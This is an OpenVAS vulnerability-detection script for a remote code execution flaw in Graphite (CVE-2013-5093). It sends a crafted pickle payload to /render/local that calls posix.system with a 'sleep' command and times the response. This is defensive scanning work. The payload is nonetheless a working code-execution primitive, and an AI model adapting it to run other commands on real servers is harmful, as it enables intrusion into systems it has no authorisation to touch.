###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_graphite_61894.nasl 11 2013-10-27 10:12:02Z jan $
#
# Graphite Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successfully exploiting this issue will allow attackers to execute
arbitrary code within the context of the application.
Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103774";

tag_insight = "In graphite-web 0.9.5, a 'clustering' feature was introduced to
allow for scaling for a graphite setup. This was achieved by passing pickles
between servers. However due to no explicit safety measures having been 
implemented to limit the types of objects that can be unpickled, this creates
a condition where arbitrary code can be executed";


tag_affected = "Graphite versions 0.9.5 through 0.9.10 are vulnerable.";
tag_summary = "Graphite is prone to a remote code-execution vulnerability.";
tag_solution = "Ask the Vendor for an update.";

tag_vuldetect = "Try to execute the 'sleep' command by sending a special crafted HTTP
request and check how long the response take.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(61894);
 script_cve_id("CVE-2013-5093");
 script_tag(name:"cvss_base", value:"9.7");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");
 script_version ("$Revision: 11 $");

 script_name("Graphite Remote Code Execution Vulnerability");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61894");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-22 17:46:22 +0200 (Thu, 22 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command.");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

host = get_host_name();

url = '/';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>Graphite Browser</title>" >!< buf)exit(0);

url = '/render/local';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 500")exit(0);

sleep = make_list(3, 5, 10);

foreach i (sleep) {

  postData = 'line\ncposix\nsystem\np1\n(S\'sleep ' + i + '\'\np2\ntp3\nRp4\n.';

  req = 'POST ' + url + ' HTTP/1.1\r\n' + 
        'Host: ' + host  + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' + 
        'Connection: close\r\n' + 
        'Content-Length: ' + strlen(postData) + '\r\n' + 
        '\r\n' + 
        postData;


  start = unixtime();     
  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();

  if(stop - start < i || stop - start > (i+5))exit(0);

}  

security_hole(port:port);
exit(0);
